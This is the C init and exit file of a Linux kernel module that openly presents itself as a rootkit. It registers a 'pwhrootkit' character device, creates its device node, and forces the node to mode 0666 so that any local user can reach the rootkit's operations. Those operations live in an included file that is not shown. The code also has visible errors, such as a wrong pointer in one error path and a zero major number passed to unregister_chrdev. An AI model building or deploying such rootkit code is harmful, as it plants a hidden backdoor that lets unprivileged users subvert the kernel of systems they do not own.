#include <linux/module.h>
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/device.h>
#include "rootkitops.c"

#define DEVICE_NAME "pwhrootkit"
#define CLASS_NAME "pwhrootkit"


static int __init pwh_init(void){
    /* 注册字符设备 */
    printk(KERN_INFO "[peiwithhao rootkit] Start to register ch-device...");
    /* 这一部分将会修改sysfs */
    major_num = register_chrdev(0, DEVICE_NAME, &pwh_rootkit_fops);
    if(major_num < 0){
        printk(KERN_INFO "[peiwithhao rootkit] register ch-device failed!");
        erro_code = major_num;
        goto err_major;
    }
    printk(KERN_INFO "[peiwithhao rootkit] Get the chrdev major_num: %d!", major_num);
    printk(KERN_INFO "[peiwithhao rootkit] Create the class...");
    /* 创建类 */
    module_class = class_create(THIS_MODULE, CLASS_NAME);
    if(IS_ERR(module_class)){
        printk(KERN_INFO "[peiwithhao rootkit] Create the class failed!");
        erro_code = PTR_ERR(module_class);
        goto err_class;
    }
    printk(KERN_INFO "[peiwithhao rootkit] Create the class Successfully!");
    printk(KERN_INFO "[peiwithhao rootkit] Create the device...");
    /* 创建设备 */
    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
    if(IS_ERR(module_device)){
        printk(KERN_INFO "[peiwithhao rootkit] Create the device failed!");
        erro_code = PTR_ERR(module_class);
        goto err_device;
    }
    printk(KERN_INFO "[peiwithhao rootkit] Register a ch-device successfully!");

    /* 赋予读写权限 */
    __file = filp_open(DEVICE_PATH, O_RDONLY, 0);
    if(IS_ERR(__file)){
        printk(KERN_INFO "[peiwithhao rootkit] Open the chrdev failed....");
        erro_code = PTR_ERR(__file);
        goto err_file;
    }
    __inode = file_inode(__file);
    __inode->i_mode |= 0666;
    filp_close(__file, NULL);
    return 0;

    /* 处理错误 */
err_file:
    device_destroy(module_class, MKDEV(major_num, 0));
err_device:
    class_destroy(module_class);
err_class:
    unregister_chrdev(0, DEVICE_NAME);
err_major:
    return erro_code;
}

static void __exit pwh_exit(void){
    printk(KERN_INFO "[peiwithhao rootkit] Peiwithhao's baby rootkit out :(\n");
    device_destroy(module_class, MKDEV(major_num, 0));
    class_destroy(module_class);
    unregister_chrdev(0, DEVICE_NAME);
}

module_init(pwh_init);
module_exit(pwh_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("peiwithhao");


